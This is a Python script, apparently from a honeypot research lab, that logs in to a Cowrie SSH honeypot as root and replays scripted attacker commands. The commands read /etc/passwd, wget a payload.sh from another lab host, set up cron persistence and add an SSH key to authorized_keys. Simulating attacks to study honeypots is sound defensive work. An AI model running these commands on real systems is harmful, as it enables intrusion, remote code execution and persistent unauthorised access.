# Author: Lazaro Perez Jr.

# Scenario 2: Scripted post-login commands on Cowrie
import time
import paramiko
output_file = 'paramiko.org'
def paramiko_A(command):
	hostname='172.30.0.20'
	print('running')
	try:
		port='2222'
		client=paramiko.SSHClient()
		client.load_system_host_keys()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		client.connect(hostname,port=2222, username='root',password='admin123',look_for_keys=False,allow_agent=False)
		channel=client.invoke_shell()
		channel.send(command+'\n')
		#(stdin,stdout,stderr)=client.exec_command(command)
		time.sleep(1)
		#cmd_output=stdout.read()
		cmd_output=channel.recv(4090).decode()
		print('log printing: ', command, cmd_output)
		with open(output_file,"w+") as file:
			file.write(str(cmd_output))
		return output_file
	finally:
		client.close()
def run():
	paramiko_A('uname -a')
	time.sleep(1)
	paramiko_A('whoami')
	time.sleep(1)
	paramiko_A('id')
	time.sleep(1)
	paramiko_A('cat /etc/passwd')
	time.sleep(1)
	paramiko_A('wget -O /root/payload.sh http://172.30.0.10:8000/payload.sh')
	time.sleep(1)
	paramiko_A('*/5 * * * * /root/payload.sh')
	time.sleep(1)
	paramiko_A("""ssh -o StrictHostKeyChecking=no -p 2222 root@172.30.0.20 "echo \"'cat ~/.ssh/id_rsa.pub'\" >> .ssh/authorized_keys" """)
	time.sleep(1)
	paramiko_A('exit')
run()
